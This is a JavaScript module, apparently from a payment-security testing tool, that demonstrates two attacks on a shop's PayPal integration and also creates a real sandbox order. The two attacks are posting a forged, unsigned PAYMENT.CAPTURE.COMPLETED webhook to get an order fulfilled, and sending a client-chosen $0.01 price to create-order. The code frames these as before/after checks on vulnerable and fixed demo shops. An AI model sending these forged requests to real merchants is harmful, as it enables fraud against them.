// Live proof mode. Turns findings into demonstrated exploits instead of warnings.
//
// 1) WEBHOOK FORGERY (no PayPal creds needed): POST a forged
//    PAYMENT.CAPTURE.COMPLETED to a target webhook URL and show whether the
//    target fulfills it. Run against the vulnerable shop (gets fulfilled) and
//    the fixed shop (ignored) to show before/after.
// 2) AMOUNT TAMPERING (no creds needed): POST a $0.01 amount to the target's
//    create-order and show the server echoes the attacker-chosen price.
// 3) LIVE SANDBOX (needs PAYPAL_CLIENT_ID/SECRET): mint a real OAuth token and
//    create a real sandbox order, proving the PayPal integration end-to-end and
//    that the correct flow builds the amount server-side.
import { createOrder, getAccessToken, haveCreds, BASE } from '../paypal/sandbox.js';

async function post(url, obj, headers = {}) {
  const res = await fetch(url, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(obj) });
  let data; try { data = await res.json(); } catch { data = {}; }
  return { status: res.status, data };
}

export async function proveWebhookForgery(targetUrl) {
  const forged = {
    id: 'WH-FORGED-' + Date.now(),
    event_type: 'PAYMENT.CAPTURE.COMPLETED',
    resource: { id: 'ORDER-FORGED-1', amount: { value: '100.00', currency_code: 'USD' } },
  };
  // no valid paypal-transmission-sig header: this is an unsigned, forged event
  const { status, data } = await post(targetUrl, forged, { 'paypal-transmission-id': 'forged', 'paypal-transmission-time': new Date().toISOString() });
  const fulfilled = Array.isArray(data.fulfilled) && data.fulfilled.includes('ORDER-FORGED-1');
  return { exploit: 'webhook-forgery', targetUrl, status, fulfilled, verdict: fulfilled ? 'VULNERABLE: forged event was fulfilled' : 'SAFE: forged event ignored', response: data };
}

export async function proveAmountTampering(targetUrl) {
  const { status, data } = await post(targetUrl, { amount: '0.01', sku: 'sku-pro' });
  const value = data?.order?.purchase_units?.[0]?.amount?.value;
  const tampered = value === '0.01';
  return { exploit: 'amount-tampering', targetUrl, status, acceptedValue: value ?? null,
    verdict: tampered ? 'VULNERABLE: server used attacker amount $0.01' : (data.error ? `SAFE: ${data.error}` : 'SAFE: server ignored client amount'),
    response: data };
}

export async function proveLiveSandbox({ value = '100.00' } = {}) {
  if (!haveCreds()) return { exploit: 'live-sandbox', skipped: true, reason: 'No PAYPAL_CLIENT_ID/PAYPAL_CLIENT_SECRET set (owner sign-up step).' };
  const token = await getAccessToken();
  const order = await createOrder({ value });
  return { exploit: 'live-sandbox', base: BASE, tokenMinted: !!token, orderId: order.id, orderStatus: order.status,
    note: 'Real PayPal sandbox order created server-side with a trusted amount.' };
}
